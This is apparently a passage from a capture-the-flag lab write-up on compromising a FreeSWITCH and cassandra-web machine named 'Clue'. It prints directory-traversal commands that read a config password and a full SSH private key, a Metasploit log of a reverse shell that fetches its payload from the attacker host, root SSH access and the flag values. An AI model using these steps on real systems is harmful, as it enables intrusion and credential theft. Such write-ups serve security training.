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" alt="211e362b9a1c386b94459ffb9983bdf5.png"/></p>
+<p>Using the exploit, I managed to successfully read some sort of password <code class="inline-code">StrongClueConEight021</code> from one of the location:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ python3 exp.py 192.168.233.240 &quot;/etc/freeswitch/autoload_configs/event_socket.conf.xml&quot;
+
+&lt;configuration name=&quot;event_socket.conf&quot; description=&quot;Socket Client&quot;&gt;
+  &lt;settings&gt;
+    &lt;param name=&quot;nat-map&quot; value=&quot;false&quot;/&gt;
+    &lt;param name=&quot;listen-ip&quot; value=&quot;0.0.0.0&quot;/&gt;
+    &lt;param name=&quot;listen-port&quot; value=&quot;8021&quot;/&gt;
+    &lt;param name=&quot;password&quot; value=&quot;StrongClueConEight021&quot;/&gt;
+  &lt;/settings&gt;
+&lt;/configuration&gt;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ python3 exp.py <span class="hljs-number">192.168</span>.<span class="hljs-number">233.240</span> <span class="hljs-string">&quot;/etc/freeswitch/autoload_configs/event_socket.conf.xml&quot;</span>
+
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;event_socket.conf&quot;</span> <span class="hljs-attr">description</span>=<span class="hljs-string">&quot;Socket Client&quot;</span>&gt;</span>
+  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;nat-map&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;listen-ip&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;0.0.0.0&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;listen-port&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;8021&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;StrongClueConEight021&quot;</span>/&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span></span><span class="language-xml">
+<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></span></code></pre></div>
+<p>The credentials against the SSH application does not work. However, using the <code class="inline-code">freeswitch_even_socket_cmd_exec</code> module offered by Metasploit, I get a shell on the machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">msf exploit(multi/misc/freeswitch_event_socket_cmd_exec) &gt; run
+[*] Started reverse TCP handler on 192.168.45.250:8021 
+[*] 192.168.233.240:8021 - Login success
+[*] 192.168.233.240:8021 - Sending payload (95 bytes) ...
+[*] 192.168.233.240:8021 - Using URL: http://192.168.45.250/9ekrcL79
+[*] 192.168.233.240:8021 - Client 192.168.233.240 (curl/7.64.0) requested /9ekrcL79
+[*] 192.168.233.240:8021 - Sending payload to 192.168.233.240 (curl/7.64.0)
+[*] 192.168.233.240:8021 - Command Stager progress - 100.00% done (110/110 bytes)
+[*] Command shell session 1 opened (192.168.45.250:8021 -&gt; 192.168.233.240:37802) at 2026-02-05 09:11:46 -0500
+[*] 192.168.233.240:8021 - Server stopped.
+
+whoami
+freeswitch
+
+id
+uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
+
+</pre><pre class="hljs"><code>msf exploit(multi/misc/freeswitch_event_socket_cmd_exec) &gt; run
+[*] Started reverse TCP handler on <span class="hljs-number">192.168.45.250</span>:<span class="hljs-number">8021</span> 
+[*] <span class="hljs-number">192.168.233.240</span>:<span class="hljs-number">8021</span> - Login success
+[*] <span class="hljs-number">192.168.233.240</span>:<span class="hljs-number">8021</span> - Sending payload (<span class="hljs-number">95</span> bytes) ...
+[*] <span class="hljs-number">192.168.233.240</span>:<span class="hljs-number">8021</span> - Using URL: http://<span class="hljs-number">192.168.45.250</span>/<span class="hljs-number">9</span>ekrcL79
+[*] <span class="hljs-number">192.168.233.240</span>:<span class="hljs-number">8021</span> - Client <span class="hljs-number">192.168.233.240</span> (curl/<span class="hljs-number">7</span>.<span class="hljs-number">64</span>.<span class="hljs-number">0</span>) requested /<span class="hljs-number">9</span>ekrcL79
+[*] <span class="hljs-number">192.168.233.240</span>:<span class="hljs-number">8021</span> - Sending payload to <span class="hljs-number">192.168.233.240</span> (curl/<span class="hljs-number">7</span>.<span class="hljs-number">64</span>.<span class="hljs-number">0</span>)
+[*] <span class="hljs-number">192.168.233.240</span>:<span class="hljs-number">8021</span> - Command Stager progress - <span class="hljs-number">100</span>.<span class="hljs-number">00</span>% done (<span class="hljs-number">110/110</span> bytes)
+[*] Command shell session <span class="hljs-number">1</span> opened (<span class="hljs-number">192.168.45.250</span>:<span class="hljs-number">8021</span> -&gt; <span class="hljs-number">192.168.233.240</span>:<span class="hljs-number">37802</span>) at <span class="hljs-number">2026-02-05</span> <span class="hljs-number">09</span>:<span class="hljs-number">11</span>:<span class="hljs-number">46</span> -<span class="hljs-number">0500</span>
+[*] <span class="hljs-number">192.168.233.240</span>:<span class="hljs-number">8021</span> - Server stopped.
+
+whoami
+freeswitch
+
+id
+uid=<span class="hljs-number">998</span>(freeswitch) gid=<span class="hljs-number">998</span>(freeswitch) groups=<span class="hljs-number">998</span>(freeswitch)
+
+</code></pre></div>
+<p>With the new shell as the <code class="inline-code">freeswitch</code> user, I notice the <code class="inline-code">id_rsa</code> is available at the home directory of user <code class="inline-code">cassie</code>. However, I am unable to read it:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">cd cassie
+ls -la
+total 32
+drwxr-xr-x 4 cassie cassie 4096 Aug 11  2022 .
+drwxr-xr-x 4 root   root   4096 Aug  5  2022 ..
+lrwxrwxrwx 1 root   root      9 Aug  5  2022 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 cassie cassie  220 Apr 18  2019 .bash_logout
+-rw-r--r-- 1 cassie cassie 3526 Apr 18  2019 .bashrc
+drwx------ 3 cassie cassie 4096 Aug 11  2022 .gnupg
+-rw-r--r-- 1 cassie cassie  807 Apr 18  2019 .profile
+drwx------ 2 cassie cassie 4096 Aug 11  2022 .ssh
+-rw------- 1 cassie cassie 1823 Aug 11  2022 id_rsa</pre><pre class="hljs"><code>cd cassie
+ls -la
+total 32
+drwxr-xr-x<span class="hljs-number"> 4 </span>cassie cassie<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 11 </span><span class="hljs-number"> 2022 </span>.
+drwxr-xr-x<span class="hljs-number"> 4 </span>root   root  <span class="hljs-number"> 4096 </span>Aug <span class="hljs-number"> 5 </span><span class="hljs-number"> 2022 </span>..
+lrwxrwxrwx<span class="hljs-number"> 1 </span>root   root     <span class="hljs-number"> 9 </span>Aug <span class="hljs-number"> 5 </span><span class="hljs-number"> 2022 </span>.bash_history -&gt; /dev/null
+-rw-r--r--<span class="hljs-number"> 1 </span>cassie cassie <span class="hljs-number"> 220 </span>Apr<span class="hljs-number"> 18 </span><span class="hljs-number"> 2019 </span>.bash_logout
+-rw-r--r--<span class="hljs-number"> 1 </span>cassie cassie<span class="hljs-number"> 3526 </span>Apr<span class="hljs-number"> 18 </span><span class="hljs-number"> 2019 </span>.bashrc
+drwx------<span class="hljs-number"> 3 </span>cassie cassie<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 11 </span><span class="hljs-number"> 2022 </span>.gnupg
+-rw-r--r--<span class="hljs-number"> 1 </span>cassie cassie <span class="hljs-number"> 807 </span>Apr<span class="hljs-number"> 18 </span><span class="hljs-number"> 2019 </span>.profile
+drwx------<span class="hljs-number"> 2 </span>cassie cassie<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 11 </span><span class="hljs-number"> 2022 </span>.ssh
+-rw-------<span class="hljs-number"> 1 </span>cassie cassie<span class="hljs-number"> 1823 </span>Aug<span class="hljs-number"> 11 </span><span class="hljs-number"> 2022 </span>id_rsa</code></pre></div>
+<p>But using the directory traversal exploit of cassandra-web, I managed to obtain the SSH key:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ python exp.py 192.168.233.240 /home/cassie/id_rsa
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
+d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
+jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
+B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
+gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
+DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
+acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
+QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
+mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
+HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
+UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
+etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
+mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
+CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
+0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
+Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
+gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
+krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
+yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
+kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
+DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
+Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
+iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
+4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ python exp.py 192.168.233.240 /home/cassie/id_rsa
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
+d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
+jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
+B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
+gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
+DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
+acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
+QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
+mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
+HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
+UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
+etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
+mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
+CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
+0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
+Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
+gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
+krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
+yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
+kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
+DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
+Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
+iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
+4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----</code></pre></div>
+<p>I changed the permission of the key using the command <code class="inline-code">chmod 600 id_rsa</code>. For some reason, the SSH key belongs to the <code class="inline-code">root</code> user. I used it to gain root privileges on the machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ ssh root@192.168.233.240 -i id_rsa  
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Apr 29 17:57:54 2024
+root@clue:~# ifconfig
+ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.233.240  netmask 255.255.255.0  broadcast 192.168.233.255
+        ether 00:50:56:9e:09:96  txqueuelen 1000  (Ethernet)
+        RX packets 185667  bytes 12716586 (12.1 MiB)
+        RX errors 0  dropped 1937  overruns 0  frame 0
+        TX packets 29511  bytes 55449371 (52.8 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 1512  bytes 183056 (178.7 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1512  bytes 183056 (178.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@clue:~# 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ ssh root@192.168.233.240 -i id_rsa  
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Apr 29 17:57:54 2024
+root@clue:~# ifconfig
+ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.233.240  netmask 255.255.255.0  broadcast 192.168.233.255
+        ether 00:50:56:9e:09:96  txqueuelen 1000  (Ethernet)
+        RX packets 185667  bytes 12716586 (12.1 MiB)
+        RX errors 0  dropped 1937  overruns 0  frame 0
+        TX packets 29511  bytes 55449371 (52.8 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 1512  bytes 183056 (178.7 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1512  bytes 183056 (178.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@clue:~# 
+</code></pre></div>
+<p>The <code class="inline-code">local.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">root@clue:/home/anthony# find / -name &quot;local.txt&quot; 2&gt;/dev/null
+/var/lib/freeswitch/local.txt
+root@clue:/home/anthony# cat /var/lib/freeswitch/local.txt
+8d33c6d2da0900695bebfcff386b2a59
+root@clue:/home/anthony# </pre><pre class="hljs"><code>root<span class="hljs-variable">@clue</span><span class="hljs-symbol">:/home/anthony</span><span class="hljs-comment"># find / -name &quot;local.txt&quot; 2&gt;/dev/null</span>
+/var/lib/freeswitch/local.txt
+root<span class="hljs-variable">@clue</span><span class="hljs-symbol">:/home/anthony</span><span class="hljs-comment"># cat /var/lib/freeswitch/local.txt</span>
+<span class="hljs-number">8</span>d33c6d2da0900695bebfcff386b2a59
+root<span class="hljs-variable">@clue</span><span class="hljs-symbol">:/home/anthony</span><span class="hljs-comment"># </span></code></pre></div>
+<p>The <code class="inline-code">proof.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">root@clue:~# cat proof_youtriedharder.txt
+19aaac44a961ac77348d3db1e8fcbdc4
+root@clue:~# 
+</pre><pre class="hljs"><code>root<span class="hljs-variable">@clue</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat proof_youtriedharder.txt</span>
+<span class="hljs-number">19</span>aaac44a961ac77348d3db1e8fcbdc4
+root<span class="hljs-variable">@clue</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># </span>
+</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
